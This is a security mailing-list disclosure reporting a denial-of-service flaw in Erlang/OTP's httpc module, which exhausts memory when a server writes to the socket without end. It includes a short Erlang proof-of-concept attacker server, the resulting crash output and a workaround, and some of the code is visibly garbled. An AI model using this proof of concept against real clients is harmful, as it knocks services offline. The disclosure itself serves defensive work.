  oss-security - Erlang OTP's httpc module Denial of Service            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Fri, 2 May From: Seba <argos83@...il.com> To: cve-assign@...re.org, oss-security@...ts.openwall.com Subject: Erlang OTP's httpc module Denial of Service  Hi,    I've reported this issue to erlang-bugs mailing list:  Regards,  Sebastiรกn Tello.   Using httpc to connect to a malicious server can cause the system to run out of memory and crash.  Description ===========  When requesting a URL from an untrusted source using the httpc OTP module, if the server:  - accepts the connection  - does not read from the socket  - and indefinitely writes bytes in the socket.  Then the client will keep on allocating memory until the system crashes.  Proof of concept ================  Server-side (attacker):  ==== PoC module: httpc_dos.erl ==== -module(httpc_dos).  -export([server/1, server/0]).  server() -> server(Port)->   {ok, LSock} = gen_tcp:listen(Port, [binary, {packet, 0},                                         {active, false}]),   {ok, Sock} = gen_tcp:accept(LSock),   socket_write(Sock).  socket_write(Sock) ->     ok = gen_tcp:send(Sock, "A"))),     socket_write(Sock). ======== EOF =====  Start the server (use the above module).  1>   Client-side (httpc), connect to the server:  $ erl Erlang/OTP 17 [erts-6.0] [source] [64-bit] [smp:4:4] [async-threads:10] [hipe] [kernel-poll:false]  Eshell V6.0  (abort with ^G) 1> application:start(inets). ok 2>  Crash dump was written to: erl_crash.dump eheap_alloc: Cannot allocate bytes of memory (of type "heap").  Tested on ========= OTP 17 Ubuntu  Workaround ==========  Use lhttpc (https://github.com/esl/lhttpc).I haven't been able to reproduce the issue using lhttpc as the call will crash when the response size is too large.   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      